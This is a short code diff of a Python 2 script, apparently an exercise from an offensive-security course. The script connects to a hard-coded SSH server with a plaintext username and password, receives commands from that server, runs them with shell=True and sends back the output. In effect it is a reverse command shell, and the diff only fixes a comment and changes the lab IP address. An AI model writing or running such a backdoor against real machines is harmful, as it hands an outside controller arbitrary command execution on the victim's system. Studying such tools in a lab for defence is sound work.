@@ -15,8 +15,7 @@ def ssh_command(ip, user, passwd, command):
         ssh_session.send(command)
         print ssh_session.recv(1024) #read banner
         while True:
-            command = ssh_session.recv(1024) #get the command from the sSH
-            server
+            command = ssh_session.recv(1024) #get the command from the SSH server
             try:
                 cmd_output = subprocess.check_output(command, shell=True)
                 ssh_session.send(cmd_output)
@@ -25,4 +24,4 @@ def ssh_command(ip, user, passwd, command):
         client.close()
     return
     
-ssh_command('192.168.56.101', 'jwmoon', 'ted0201', 'ClientConnected') 
+ssh_command('192.168.56.1', 'jwmoon', 'ted0201', 'ClientConnected') 
